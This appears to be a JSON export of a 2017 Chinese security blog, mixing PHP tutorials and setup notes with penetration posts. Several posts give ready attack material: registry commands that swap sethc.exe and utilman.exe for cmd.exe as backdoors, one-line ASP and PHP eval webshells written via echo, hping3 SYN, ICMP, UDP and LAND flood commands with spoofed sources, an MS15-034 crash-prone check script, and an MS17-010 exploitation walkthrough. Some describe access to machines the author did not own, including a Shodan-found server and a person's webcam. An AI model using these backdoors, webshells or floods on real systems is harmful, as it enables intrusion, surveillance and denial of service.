[{"title":"一次渗透实战记录","slug":"pentest1","date":"2017-09-06T04:00:00.000Z","updated":"2017-09-07T01:43:13.312Z","comments":true,"path":"2017/09/06/pentest1/","link":"","permalink":"https://mochazz.github.io/2017/09/06/pentest1/","excerpt":"","text":"0X00前言前几天在看某个安全会议的PPT，发现里面提了一个漏洞我不怎么了解，但是很有趣，于是就打算通过shodan复现一下。这个漏洞需要对方是windows主机且开启了3389，结果试了一波，没有一台成功，估计是漏洞比较老吧(14年的)。好不容易找到一台开了3389的目标，结果没复现成功，但是通过思考分析还是打开了通往主机的大门。 0X01实战过程记录首先我原本复现的漏洞，是早些时候网络上的黑阔用来日另外一批黑阔的肉鸡控制器所用的，就是所谓的黑吃黑。我找了一台开了3389的目标机器，通过网络上公布的漏洞细节进行复现，结果发现不行，应该是修复了，或者是我的姿势不对。但是我并没有打算放弃，我想：既然这服务器是用来管理肉鸡的，黑客们必定在上面留了许多后门，于是我就想到了shift后门，之前我也有做过笔记，如果你不了解可以点这里。于是，我就按了5下shift键，然后cmd就奇迹般的出现了，运气真好。通过shift调用出的cmd是system权限，我们来查看一下上面有哪些用户，并添加账户，命令执行后会返回一串意大利文，google翻译一下当然，如果你添加账户的密码设置的太简单，会显示命令执行失败。当我们添加完账户后，将账户添加进administrators组。查看是否我们成功将用户添加进administrators管理组尝试登录，会发现出现如下错误我想可能是我们没有将用户添加到远程桌面管理组里，使用net localgroup看一下总共有哪些用户组，因为这台主机的语言使用的是意大利语言，所以远程桌面管理组可能不是我们平常所见到的Remote Desktop Users。大概意思就是”发生系统错误 1312。指定的登录会话不存在。可能已被终止。没关系，既然net localgroup命令用不了，我们可以直接查看一下administrator所在的用户组，因为administrator允许远程登录。我们使用net user administrator命令来查看administrator所在的用户组。使用net localgroup “Utenti desktop remoto” 用户名 /add命令即可将用户添加到远程桌面管理组，之后就能顺利进入主机。 0X02另类思路其实本来到这里已经结束了。但是在没拿下之前，我让表哥试试能不能拿下，后来我们几乎在同一时间拿下。但是，表哥是通过远程桌面会话劫持（RDP hijacking ）来进入主机的。我去，这是啥骚操作，赶紧google一下，发现这篇文章写的不错RDP hijacking(有墙)。大家都知道，在windows中如果你知道另一个已登录用户的密码，就可以通过认证后切换成该用户。test成功切换成administrator用户劫持方法一：创建服务实际测试截图这里有个演示视频(墙)：All Windows TS Session Hijacking (2012 R2 Demo)劫持方法二：直接利用query和tscon命令来看一下query命令用法tscon命令用法下面结合query和tscon命令达到会话劫持目的query user查询所有已登录的用户会话信息tscon 会话ID切换到目标会话状态回车之后可直接切换成目标用户登录系统。 0X03留木马后门第一种方法：替换粘滞键程序这个我之前刚好有分析实践过，也写过防护方案，具体看这篇：通过shift快捷键运行后门第二种方法：替换讲述人程序根据老外的文章，把讲述人程序替换cmd.exe也是可以的，然而我测试时失败了。老外还给出了直接修改注册表项的命令，然而我两个试了都不管用(win03上测试的)，这里还是贴出来吧，谁要是知道告诉我一下。将sethc.exe替换成cmd.exe REG ADD &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe&quot; /t REG_SZ /v Debugger /d “C:\\windows\\system32\\cmd.exe” /f 将utilman.exe替换成cmd.exe REG ADD &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe&quot; /t REG_SZ /v Debugger /d “C:\\windows\\system32\\cmd.exe” /f 0X04防御方案监控系统进程活动，开启日志记录，当有新；禁止使用sethc.exe和utilman.exe快捷键使用；异常服务创建和异常计划任务创建是应有日志记录；通过组策略来限制sethc.exe和utilman.exe所有者的访问执行权限；不要将开启RDP(Remote Desktop Protocol)/RDS(Relational Database Service)服务的主机暴露在公网上； 0X05总结这次的的渗透经历，总的来说还是学到不少，突破点就是利用前人种的马。所以说思路很重要，还是要多多看其他人的文章。另外，英语还是挺重要的，有的东西可以多看看外文。","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://mochazz.github.io/categories/渗透测试/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://mochazz.github.io/tags/windows/"}]},{"title":"Win2003搭建shadowsocks服务端","slug":"win03_ss","date":"2017-09-05T03:25:00.000Z","updated":"2017-09-07T01:42:54.955Z","comments":true,"path":"2017/09/05/win03_ss/","link":"","permalink":"https://mochazz.github.io/2017/09/05/win03_ss/","excerpt":"","text":"0X00前言本来打算在一台肉鸡上装shadowsocks的，结果无法在肉鸡上监听外网地址的端口，估计是做了内网到外网的端口映射，我在本地虚拟机上搭建成功，所以还是做个笔记。 0X01搭建ss过程装上python2.7.13装上Node.js v0.11.0windows2003双击安装最新版的nodejs会没反应，所以安装旧版即可。打开cmd，输入npm install -g shadowsocks安装ss装好之后进入C:\\Documents and Settings\\Administrator\\Application Data\\npm\\node_modules\\shadowsocks目录，找到config.json并如下编辑在cmd中运行ssserver命令即可客户端配置如下客户端浏览器设置代理，成功访问freebuf 0X02总结没有总结了","categories":[{"name":"ss搭建","slug":"ss搭建","permalink":"https://mochazz.github.io/categories/ss搭建/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://mochazz.github.io/tags/windows/"}]},{"title":"echo写马技巧","slug":"echo","date":"2017-08-26T15:41:00.000Z","updated":"2017-09-07T01:44:42.065Z","comments":true,"path":"2017/08/26/echo/","link":"","permalink":"https://mochazz.github.io/2017/08/26/echo/","excerpt":"","text":"windows下echo写马错误写马方式 echo &quot;&lt;%eval request(cmd)%&gt;&quot; &gt; C:\\Users\\Mochazz\\Desktop\\test.asp 正确写马方式 echo ^&lt;%eval request(cmd)%^&gt; &gt; C:\\Users\\Mochazz\\Desktop\\test.asp Linux下echo写马echo “&lt;?php @eval($_POST[&apos;cmd&apos;]); ?&gt;” &gt; cmd.php 参考：sa权限获取webshell思路","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://mochazz.github.io/categories/渗透测试/"}],"tags":[{"name":"木马","slug":"木马","permalink":"https://mochazz.github.io/tags/木马/"}]},{"title":"可移动的linux系统","slug":"linux_on_udisk","date":"2017-08-19T04:18:00.000Z","updated":"2017-09-07T01:42:26.847Z","comments":true,"path":"2017/08/19/linux_on_udisk/","link":"","permalink":"https://mochazz.github.io/2017/08/19/linux_on_udisk/","excerpt":"","text":"准备工具unetbootindeepin-15.4.1-amd64.iso还需要两个U盘，一个用来做启动盘，另一个用来装我们的linux系统 制作linux启动盘这里提供两种安装方式，选择使用已经下载好的iso文件来安装一切就绪后选择退出，重启系统 安装linux系统到U盘选择通过U盘启动，进入安装deepin安装完成，成功进入deepin linux系统，以后就可以通过U盘直接进入linux系统了 后记问题一刚开始制作启动盘时，突然发现我windows10的电脑显示已经连接U盘，但是盘符不见了，也就无法进入U盘，一脸懵逼，前一阵子还用的好好的。解决方法如下找到你的U盘，右键选择删除设备后，再重新拔插U盘，即可看到盘符 问题二安装完deepin linux后，发现无线信号超级差，可以说根本无法上网，除非插网线。这个问题其实是我的网卡(rtl8723be)对linux系统支持不好造成的，之前也解决过，这里做个记录 安装网卡驱动git clone https://github.com/lwfinger/rtlwifi_newcd rtlwifi_newmake installmodprobe rtl8723be 编辑/etc/modprobe.d/rtl8723be.conf文件，添加如下语句options rtl8723be ant_sel=2options rtl8723be ips=0options rtl8723be fwlps=0options rtl8723be swenc=1之后重启系统即可解决","categories":[{"name":"linux","slug":"linux","permalink":"https://mochazz.github.io/categories/linux/"}],"tags":[{"name":"安装linux系统","slug":"安装linux系统","permalink":"https://mochazz.github.io/tags/安装linux系统/"}]},{"title":"MS15-034","slug":"ms15-034","date":"2017-08-16T13:14:00.000Z","updated":"2017-09-07T01:42:12.231Z","comments":true,"path":"2017/08/16/ms15-034/","link":"","permalink":"https://mochazz.github.io/2017/08/16/ms15-034/","excerpt":"","text":"前言前一阵子在对某网站进行漏洞扫描时，发现存在MS15-034远程代码执行漏洞。这是一个位于HTTP.SYS中的整数溢出漏洞。UlpParseRange处发生了整数溢出，而在此处导致了安全检查的绕过。具体的分析，还是看360的这篇分析吧。 漏洞利用通过给IIS服务器发送如下格式的HTTP请求，就可以触发（检测）这个漏洞 GET / HTTP/1.1 Host: stuff Range: bytes=0-18446744073709551615 检测脚本#!/usr/bin/env python # -*- coding: utf-8 -*- #The IIS Vul （CVE-2015-1635，MS15-034）Check Script. #HTTP.sys Remote Code Execute. ############################################### # example: python ms15-034.py www.example.com # ############################################### import sys import requests def Check_CVE_2015_1635(Ip_Str): if Ip_Str: Server_Tag = [&apos;Microsoft-HTTP&apos;,&apos;Microsoft-IIS&apos;] Tmp_Req_Url = str(&apos;&apos;.join([&apos;http://&apos;,Ip_Str])) Request_Tmp = requests.get(Tmp_Req_Url) remote_server = Request_Tmp.headers[ &apos;server&apos;] if (tmp_tag in remote_server for tmp_tag in Server_Tag): print(&quot;[+] Web Service Is &quot; + remote_server) MS15_034_Execute(Tmp_Req_Url) else: print(&quot;[+] Web Service Is Not IIS\\n[+] May Be &quot; + remote_server) def MS15_034_Execute(domain): print(&quot;[+] Start Checking...&quot;) Req_headers = {&apos;Host&apos;: &apos;stuff&apos;,&apos;Range&apos;: &apos;bytes=0-18446744073709551615&apos;} Request = requests.get(domain, headers=Req_headers) if &apos;Requested Range Not Satisfiable&apos; in Request.content: print(&quot;[+] The HTTP.sys remote code execution vulnerability Is Exists!&quot;) elif &apos;The request has an invalid header name&apos; in Request.content: print(&quot;[+] The vulnerability has been fixed!&quot;) else: print(&quot;[+] The IIS service was unable to display the vulnerability exists, the need for manual testing!&quot;) def main(): ip_Str = sys.argv[1] Check_CVE_2015_1635(ip_Str) if __name__ == &apos;__main__&apos;: main() 测试结果这个验证脚本在验证时，会导致系统蓝屏，测试时请谨慎使用。相关文章：MS15-034/CVE-2015-1635 HTTP远程代码执行漏洞分析Microsoft Security Bulletin MS15-034 - Critical Vulnerability in HTTP.sys Could Allow Remote Code Execution","categories":[{"name":"服务安全","slug":"服务安全","permalink":"https://mochazz.github.io/categories/服务安全/"}],"tags":[{"name":"ms15-034","slug":"ms15-034","permalink":"https://mochazz.github.io/tags/ms15-034/"}]},{"title":"PHP之面向对象","slug":"php(5)","date":"2017-08-13T08:31:00.000Z","updated":"2017-09-07T01:41:39.359Z","comments":true,"path":"2017/08/13/php(5)/","link":"","permalink":"https://mochazz.github.io/2017/08/13/php(5)/","excerpt":"","text":"类使用class关键字创建一个类，变量叫属性，函数叫方法。使用new关键字实例化一个对象 类成员的访问控制Public：可以在任何地方被访问Protected：可被其所在的类的子类和父类访问Private：只能在类内部被访问，子类不能访问父类的私有属性如未声明，默认为public 常量使用const定义类常量使用this关键字在类内部访问成员变量和方法 构造函数和析构函数构造函数在使用new关键字创建对象时自动执行，可传入参数；析构函数在对象被销毁时自动执行，不能有参数。 clone一个对象clone将原对象的所有信息从内存中赋复制一份，存储在新开辟的内存中。 继承PHP中使用extends继承一个类，不存在多继承，一个类只能继承一个父类。 parent::关键字使用parent::关键字访问父类 魔术方法__clone()方法__clone方法会重写clone，当使用clone时，不仅会复制变量，还会执行__clone里面的代码 __toString() __autoload()__autoload()方法会在第一次引用一个类时调用该方法，可以通过定义这个函数来启用类的自动加载 __set()和__get()用于处理类内未定义的属性或者处理私有属性 __call()用于处理类内未定义的方法，第一个参数为方法名，第二个参数为方法的参数；还可用于不同方法名但功能相同的方法。 __invoke()和__callStatic() 序列化 json数据json_decode(string,bool)当第二个参数为true时，返回一个数组，默认为false返回一个对象。 抽象类使用关键字abstract来声明一个抽象类以及抽象方法。抽象类不能实例化对象，子类继承抽象父类后，子类中必须有父类中的抽象方法。抽象类起到规定子类结构的作用，子类必须给出父类抽象方法的实现。 接口接口是一种特殊的抽象类，使用关键字interface来声明一个接口，不能实例化对象。接口中的方法必须全是抽象方法成员属性必须是常量。所有的权限必须是public，由子类来拓展。使用implements代替extends来实现接口，一个类只能继承一个父类，但是可实现多个接口。如果一个类同时使用了继承父类和实现接口，必须先继承再实现。 多态 文件上传上传文件后，可以看到数组_FILES中添加了一个以file控件的name值为键，Lighthouse.jpg的详细信息为值。","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://mochazz.github.io/categories/编程语言/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://mochazz.github.io/tags/PHP/"}]},{"title":"PHP之函数","slug":"php(4)","date":"2017-08-03T08:43:00.000Z","updated":"2017-09-07T01:41:32.618Z","comments":true,"path":"2017/08/03/php(4)/","link":"","permalink":"https://mochazz.github.io/2017/08/03/php(4)/","excerpt":"","text":"func_get_args和func_num_args 按值传参 引用传参 默认参数 局部变量函数中的变量无特殊声明，则为动态地分配存储空间，在函数调用后将自动释放。 静态变量使用static关键字声明，可确保变量的内存地址不变。只有在函数第一次执行时会调用执行static语句，之后调用函数将不再执行。 全局变量使用global声明变量，是全局变量的一个引用，也可以使用$GLOBALS[“var”] = “test”;来声明。 global与$GLOBALS区别PHP中可以先调用函数，再定义该函数，只不过会有警告，可以用error_reporting(0);屏蔽。用变量存储函数名 文件包含 include和require的区别如果要通过文件包含来加载一个函数，在调用函数之前必须先包含该文件，不能先使用在包含，所以一般包含语句都写在PHP程序开头。PHP不支持函数重载，也就不允许重复包含同一个文件，所以使用include_once()或require_once()可以避免该问题 PHP模板化","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://mochazz.github.io/categories/编程语言/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://mochazz.github.io/tags/PHP/"}]},{"title":"PHP之数组与文件","slug":"php(3)","date":"2017-08-01T02:00:00.000Z","updated":"2017-09-07T01:41:25.621Z","comments":true,"path":"2017/08/01/php(3)/","link":"","permalink":"https://mochazz.github.io/2017/08/01/php(3)/","excerpt":"","text":"数组数组操作符使用+操作符号时，如果两个数组有相同的键，将不会添加。 访问数组 数组的创建与添加数组元素的添加和删除implode()、explode()数组与字符串互转 in_array()判断键是否在数组中array_merge()合并数组 array_combine() extrace()将数组转换成标量变量 array_keys()和array_values() 文件操作使用fopen()函数打开文件，它支持绝对路径和相对路径打开文件时有以下三种选择 使用fclose()函数关闭该指针指向的文件 使用fread()、filesize()读取文件大小及内容 fpassthru()函数 fgets()和fgetss()函数fgets()函数读取到第一个换行字符(\\n)或文件结束符(EOF)，或自定义长度-1 fwrite()函数 文件处理函数file_get_contents和file_put_contents 其他文件处理函数 fread()函数 文件锁flock()","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://mochazz.github.io/categories/编程语言/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://mochazz.github.io/tags/PHP/"}]},{"title":"php之字符串和正则匹配","slug":"php(2)","date":"2017-08-01T01:12:00.000Z","updated":"2017-09-07T01:41:19.152Z","comments":true,"path":"2017/08/01/php(2)/","link":"","permalink":"https://mochazz.github.io/2017/08/01/php(2)/","excerpt":"","text":"字符串单引号变量和转义的序列都不会进行转义，而会原样输出。 双引号PHP会处理双引号括起来的字符串、变量以及转义序列 标识符(定界符)需要输出大量文本时，可以使用标识符来定义字符串。 字符串拼接 格式化字符串 获取字符串 字符串查找 字符串替换 正则匹配(1)^PHP 匹配以PHP开头的字符串 [^a-z] 表示匹配所有非小写字母开头的字符串2PHP$ 匹配以PHP结尾的字符串(3)^PHP$ 精确匹配PHP字符串(4)PHP 匹配所有含有PHP的字符串(5)com|org|net 匹配com、org、net中的任意一个(6)PHP内置通用字符集(7)使用{}确定重复出现的次数(8)?与{0,1}相等(9)*与{0,}相等(10)+与{1,}相等 正则匹配函数int ereg ( string $pattern , string $string [, array &amp;$regs ] ) ereg(匹配规则，要匹配的字符串，匹配结果存放数组) 该函数会将匹配中的子串存在regs数组中，regs[0]为原字符串，regs[1]为第一个匹配中的字符串，regs[2]为第二个匹配中的字符串。如果省略第三个参数，则匹配中返回true;否则返回false。php5.3以上的版本不支持ereg()函数，而是使用preg_match()函数。array split ( string $pattern , string $string [, int $limit = -1 ] )array explode ( string $delimiter , string $string [, int $limit = PHP_INT_MAX ] )explode(一个分割用的字符或字符串，原始字符串，最多分割成多少个子串)","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://mochazz.github.io/categories/编程语言/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://mochazz.github.io/tags/PHP/"}]},{"title":"PHP之基础入门","slug":"php(1)","date":"2017-07-30T09:00:00.000Z","updated":"2017-09-07T01:41:11.399Z","comments":true,"path":"2017/07/30/php(1)/","link":"","permalink":"https://mochazz.github.io/2017/07/30/php(1)/","excerpt":"","text":"PHP四种不同的标记风格&lt;?php 代码 ?&gt; 官方推荐风格 &lt;? 代码 ?&gt; 短标记风格，需配置文件php.ini中开启short+open_tag &lt;% 代码 %&gt; ASP风格，需配置文件php.ini中开启asp_tags &lt;script language=”php”&gt; 代码 &lt;/script&gt; JavaScript标记的风格，这种风格在任何情况下都可以使用。 注释单行注释C++风格单行注释 //这是单行注释 Shell风格单行注释 #这是单行注释 多行注释/* *这是多行注释 */ 变量声明 引用赋值使用引用赋值时，两个变量将会指向内存中的同一个存储空间，任何一个变量发生变化都会引起另一个变量的变化。 变量可变变量这种写法不推荐在项目开发中使用，因为代码可读性差，但是以前却可以用来写过狗一句话 全局变量在关键字前加global 超全局变量组 常量自定义常量boolean define(string name,mixed value[, bool case_insensitive])当case_insensitive为true时，常量名不区分大小写 魔术常量PHP为弱类型语言，变量类型由数据决定 字符串单引号变量和转义的序列都不会进行转义 双引号PHP会处理双引号括起来的字符串、变量以及转义序列 数组由键值对组成，键可以是数字，也可以是字符串sort按数值从小到大排序，键变成顺序索引，按数字、ASCII字符、中文字符排序。rsort按数值从大到小排序，键变成顺序索引。ksort按键从小到大排序，键在原来的基础上发生变化。asort按数值从小到大排序，键在原来的基础上发生变化。 类型转换隐式强制类型转换不同类型进行数值比较 显式强制类型转换 强制类型转换函数","categories":[{"name":"编程语言","slug":"编程语言","permalink":"https://mochazz.github.io/categories/编程语言/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://mochazz.github.io/tags/PHP/"}]},{"title":"通过shift快捷键运行后门","slug":"shift","date":"2017-07-28T16:30:00.000Z","updated":"2017-09-07T01:28:23.834Z","comments":true,"path":"2017/07/29/shift/","link":"","permalink":"https://mochazz.github.io/2017/07/29/shift/","excerpt":"","text":"简介我们都知道，windows系统按5下shift后，windows就执行了system32下的sethc.exe，也就是启用了粘滞键。虽然快捷方便，但却存在安全隐患。 偷天换日将我们的cmd.exe或者木马后门名字改成sethc.exe，然后替换C:windows\\system32\\sethc.exe程序按5下shift键可以调出cmd命令窗口，还可以添加账户：这里因为我添加的账户名称后面有一个$符号，使用net user查看是看不到的，我们可以试着登录系统看看是否添加成功：如果你登录不了的话，你可能需要先把用户添加到administrators组里：1net localgroup administrators admin$ /add Lpk后门添加一般系统都存在lpk.dll文件，该文件位于C:\\WINDOWS\\system32和C:WINDOWS\\system\\dllcache目录下。当exe文件运行时，lpk.dll就会被Windows动态链接，系统会先从当前目录查找，然后在到系统目录查找并加载。下面使用工具生成木马并保存为lpk.dll。我们要做的就是替换系统的lpk.dll文件。将这个文件替换系统自带的文件，并按5次shift键，系统就会运行sethc.exe程序，进而lpk.dll就会被Windows动态链接，同时按下我们设置的键(我设置的是65和83，即一起按下AS键)输入我们设置的密码，最终弹出我们的shell窗口，添加账号后即可登录。 修复方案方案一：删除sethc.exe程序所有用户运行权限接下来就无法使用粘滞键快捷键了，另外提醒一下，直接删除sethc.exe是没用的，系统还会自动找回。方法二：添加一个everyone用户组，然后权限选择拒绝所有方案三：禁用shift快捷键方案四：针对lpk后门，现在的防护软件基本可以查杀","categories":[{"name":"Windows","slug":"Windows","permalink":"https://mochazz.github.io/categories/Windows/"}],"tags":[{"name":"后门","slug":"后门","permalink":"https://mochazz.github.io/tags/后门/"}]},{"title":"windows10安装linux子系统","slug":"linux_subsystem","date":"2017-07-27T09:10:00.000Z","updated":"2017-09-07T01:28:07.718Z","comments":true,"path":"2017/07/27/linux_subsystem/","link":"","permalink":"https://mochazz.github.io/2017/07/27/linux_subsystem/","excerpt":"","text":"安装linux子系统在设置里面选择更新和安全勾选开发人员模式在控制面板的程序和功能，点击启用或关闭windows功能，勾上适用于linux的windows子系统接着重启就好打开cmd输入bash回车输入y即可开始安装 错误解决当然，在这里有个坑，我下了好久，一直出现0x80072ee2下载错误的问题。出现 0x80072ee2的错误代码是由于服务器无响应造成的，我们可以更改DNS地址接下来下载就快很多了，10分钟不到就下载好了通过bash安装的是Ubuntu 16.04.2 LTS 设置自己的Bash banner下载好后总要搞点事情，没办法，就是爱折腾在/etc/bash.bashrc文件的最后一行添加linux_logo -f -L 30 &amp;&amp; figlet -ct Mohcazz，当然使用这两条命令的前提是安装了linuxlogo和figlet这样以后每次从cmd进入bash就会出现如下界面 安装metasploit换上kali更新源，自己用vi命令改一下吧添加kali源后直接更新会遇到如下问题：添加kali key后就能正常更新了 sudo apt-key adv --keyserver keyserver.ubuntu.com --recv ED444FF07D8D0BF6 Executing: /tmp/tmp.A0UNJSF9eW/gpg.1.sh --keyserver 成功进入metasploit： 开启图形化界面下载安装Xming X Server for Windows，安装之后运行其中的Xlaunch，界面如图：编辑.bashrc文件sudo vi ~/.bashrc在文件末尾添加export DISPLAY=:1.0或者直接使用echo “export DISPLAY=:1.0” &gt;&gt; ~/.bashrc命令安装xfce4终端sudo apt install xfce4-terminal打开firefox浏览器sudo firefoxsudo xfce4-session 后记使用nmap的时候发现会出现如下问题经过一番查阅资料，发现这是一个未修复的坑，反正所有和网卡或socket有关的命令可能都不能用，有待开发人员解决。不过在windows运行linux已经算是一重大突破，所以还是静候佳音吧。其他Tips","categories":[{"name":"Windows","slug":"Windows","permalink":"https://mochazz.github.io/categories/Windows/"}],"tags":[{"name":"linux子系统","slug":"linux子系统","permalink":"https://mochazz.github.io/tags/linux子系统/"}]},{"title":"使用hexo+github部署自己的博客","slug":"hexo-build","date":"2017-07-26T08:00:00.000Z","updated":"2017-09-07T01:29:23.447Z","comments":true,"path":"2017/07/26/hexo-build/","link":"","permalink":"https://mochazz.github.io/2017/07/26/hexo-build/","excerpt":"","text":"开启github pages先注册一个github账号然后先登录你之前注册账号时用的邮箱，认证之后，选择新建仓库找到settings，往下拉到GitHub Pages这样，我们的blog首页就做好了Hexo主题链接 安装git 安装nodejs这里没有什么好说明的，直接默认下一步安装就好。 安装hexo创建一个用于存放hexo组件的目录，我这里创建一个blog目录为例，进入创建好的blogs目录，右键选择git bash here使用npm安装hexo客户端：npm install hexo-cli -g下载好hexo后，初始化：hexo init使用hexo -v查看所安装的hexo版本，使用hexo h查看帮助文档：打开本地博客根目录下的 _config.yml 文件，最下面找到 Deployment使用hexo s在本地4000端口开启服务，浏览器访问http://127.0.0.1:4000即可看到我们的博客首页：这样就算搭建成功，如果需要发布自己的博文，需要先用markdown语法来写你的博文并保存成.md格式文件，然后放到blogs\\source_posts目录下。本地查看博文效果使用hexo s，要部署到到github page上的话使用hexo g &amp;&amp; hexo d然后根据提示输入你的github账号密码即可。下面这是我的博文：Markdown语法大致这样： 遇到的错误错误一：找不到git解决方法：npm install hexo-deployer-git –save错误二：无法自动检测邮箱解决方法：设置一下邮箱就好，邮箱必须是你注册github时绑定的那个邮箱git config –global user.email “youmail@163.com”接下来就可以正常将你的博客部署到github上了。了解hexo各个参数更详细的使用方法","categories":[{"name":"博客搭建","slug":"博客搭建","permalink":"https://mochazz.github.io/categories/博客搭建/"}],"tags":[{"name":"windows安装hexo","slug":"windows安装hexo","permalink":"https://mochazz.github.io/tags/windows安装hexo/"}]},{"title":"hping3使用","slug":"hping3","date":"2017-07-23T14:00:00.000Z","updated":"2017-09-07T01:27:33.687Z","comments":true,"path":"2017/07/23/hping3/","link":"","permalink":"https://mochazz.github.io/2017/07/23/hping3/","excerpt":"","text":"简介hping3是一款免费的数据包生成器和分析器。可用于安全审计、防火墙规则测试、网络测试、端口扫描、性能测试，压力测试(DOS)，几乎可以发送任意类型的TCP/IP数据包。功能强大但是每次只能向一个IP地址发送数据包，还能够在两个相互包含的通道之间传送文件。 ICMP测试hping3 -1 192.168.100.105（类似于ping 192.168.100.105） 数据包跟踪hping3 –traceroute -V -1 www.baidu.com（类似于traceroute www.baidu.com） 端口扫描单端口扫描hping3 -I eth0 -p 22 -c 1 -S 192.168.100.104hping3 -I eth0 -p 1 -c 1 -S 192.168.100.104 多端口扫描hping3 -8 1-1024 192.168.100.102 文件传输发送端：hping3 -2 -p 1373 192.168.100.102 -d 100 -E test.txt-2 UDP模式 -p端口-d 数据大小 -E 文件名接收端：nc -lp 1373 -u -w 5 &gt; recv.txt &amp;&amp; cat recv.txt-l 监听模式 -p 端口-w 超时时间 -u UDP模式 主机发现虽然hping3一次只能扫描一个IP，但是我们可以结合shell脚本语言完成整个网段的扫描。下面使用for循环来实现：for addr in $(seq 1 254);do hping3 192.168.1.$addr -c 1 –icmp &amp; donefor addr in $(seq 1 254);do hping3 192.168.1.$addr -c 1 –icmp &gt;&gt; result2.txt &amp; donecat result2.txt | grep ^len(通过该命令实现查看存活主机功能，^len表示以len开头的行) DOS攻击Syn Flood攻击hping3 -c 1000 -d 120 -S -p 80 –flood –rand-source 192.168.100.1-c 指定连接数 -p 目标端口-d 指定数据部分的大小 -S 攻击类型是Syn flood–flood 以泛洪的方式攻击 –rand-source 随机产生伪造源地址hping3 -S -P -U -p 80 –flood –rand-source 192.168.100.1-P flag置为Push -U flag置为Urge紧急加这两参数可以提高效率 TCP Flood攻击使用以下命令建立全连接：hping3 -SARUPF -p 80 –flood –rand-source 192.168.100.1 ICMP Flood攻击hping3 -q -n -d 200 –icmp –flood -a 11.11.11.11 192.168.100.1-q安静模式 -n不解析域名 -a指定伪造IP UDP Flood 攻击hping3 –udp -s 6666 -p 53 -a 8.8.8.8 –flood 192.168.100.1LAND攻击hping3 -n -S -p 80 -a 192.168.100.1 –flood 192.168.100.1hping原理、安装、使用详解介绍hping3命令 | hping3","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://mochazz.github.io/categories/渗透测试/"}],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://mochazz.github.io/tags/工具使用/"}]},{"title":"MS17-010复现","slug":"ms17-010","date":"2017-07-15T14:00:00.000Z","updated":"2017-09-07T01:27:20.176Z","comments":true,"path":"2017/07/15/ms17-010/","link":"","permalink":"https://mochazz.github.io/2017/07/15/ms17-010/","excerpt":"","text":"MS17-010具体点这里，以下是复现过程。使用netdiscover扫描内网存活主机：使用nmap扫描其开放端口：使用msfconsole打开msf：使用search命令搜索与ms17-010有关的利用模块：如果不了解某个模块的作用，可以先use 模块名，然后使用show info:我们先使用auxiliary/scanner/smb/smb_ms17_010模块验证漏洞是否存在：既然漏洞存在且可以利用，那么我们使用模块进行攻击：exploit攻击，成功返回shell：我们来看一下当前的用户权限：在system权限下我们可以干很多事情，比如说开摄像头：大概知道我要拍照，特意摆了一个poss～～我们来看一下系统信息：我们来读取一下他的密码：尴尬，密码不知为何显示为空:既然这样我们换一种方法，上传wce64.exe伪装成wifi.exe:使用wifi.exe -w读取明文密码：还是不能获取密码。算了，不玩了。后来第二天我把这漏洞告诉那小哥哥，并让他赶紧去打补丁，顺便问了下，原来他没设密码。","categories":[{"name":"系统安全","slug":"系统安全","permalink":"https://mochazz.github.io/categories/系统安全/"}],"tags":[{"name":"ms17-010","slug":"ms17-010","permalink":"https://mochazz.github.io/tags/ms17-010/"}]},{"title":"漏洞环境搭建之Windows+IIS6.0+SqlServer+ASP","slug":"IIS","date":"2017-07-14T14:00:00.000Z","updated":"2017-09-07T01:27:06.621Z","comments":true,"path":"2017/07/14/IIS/","link":"","permalink":"https://mochazz.github.io/2017/07/14/IIS/","excerpt":"","text":"环境准备Windows2003SQLEXPR_CHS.exe(2005)SQLServer2005_SSMSEE.msiFramewoek3.5asp_cms带有原有数据库文件(Fei.bak) 安装好的windows2003系统这是新安装好的一个windows2003系统： 安装IIS选中“应用程序服务器(IIS,ASP.NET)”，单击“下一步”：在virtualbox菜单栏上选择设备-&gt;分配光驱-&gt;选中windows2003的iso文件：点击确定，即开始安装。安装完成如下： 安装Framework3.5很好安装，一直下一步即可： 安装sqlserver2005 安装sqlserver2005管理工具一直下一步就好 建设网站右键网站-&gt;新建-&gt;网站：下一步，随便写个对于网站的描述：使用默认设置：选择网站的根目录：给访问用户读取权限即可：添加主页名称：执行权限选择纯脚本，并开启父路径：最后应用确定即可： 还原数据库成功还原后如下： 其他配置修改网站连接数据库的配置文件：打开浏览器访问，出现如下问题：这是因为我们没有给Internet来宾账户相应的权限，解决方法如下：找到网站根目录，右键属性-&gt;安全如果没有Internet来宾账户，添加即可：选择添加-&gt;高级-&gt;立即查找-&gt;选中IUSER-**-&gt;确定即可添加后给以下权限即可：如果能成功登录后台，说明我们的数据库和网站已经关联在一起了：","categories":[{"name":"Windows","slug":"Windows","permalink":"https://mochazz.github.io/categories/Windows/"}],"tags":[{"name":"环境搭建","slug":"环境搭建","permalink":"https://mochazz.github.io/tags/环境搭建/"}]},{"title":"漏洞环境搭建之Linux+Apache+Mysql+PHP","slug":"LAMP","date":"2017-07-13T14:00:00.000Z","updated":"2017-09-07T01:26:43.214Z","comments":true,"path":"2017/07/13/LAMP/","link":"","permalink":"https://mochazz.github.io/2017/07/13/LAMP/","excerpt":"","text":"环境准备Ubuntu16.04apache2MySQLPHP5.6php_cms带有原有数据库文件 安装apache2先更新一下源1apt-get update 安装apache21apt-get install apache2 -y 查看apache是否安装好,下图表示安装成功： 安装MySQL安装MySQL1apt-get install mysql-server -y 设置密码:再次输入密码确认：查看MYSQL是否安装好,下图表示安装成功： 安装php5.6这个可要好好说说了，因为这个地方卡了很久。Ubuntu16.04使用apt-get install 